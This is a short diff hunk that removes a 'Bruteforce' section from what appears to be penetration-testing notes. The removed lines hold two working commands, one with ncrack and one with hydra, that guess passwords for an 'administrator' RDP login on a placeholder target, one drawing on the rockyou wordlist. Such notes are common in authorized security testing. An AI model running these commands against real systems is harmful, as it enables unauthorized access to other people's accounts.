@@ -1,4 +1,0 @@
-> Bruteforce
-
-* ncrack -vv --user administrator -P password-file.txt rdp://$ip
-* hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
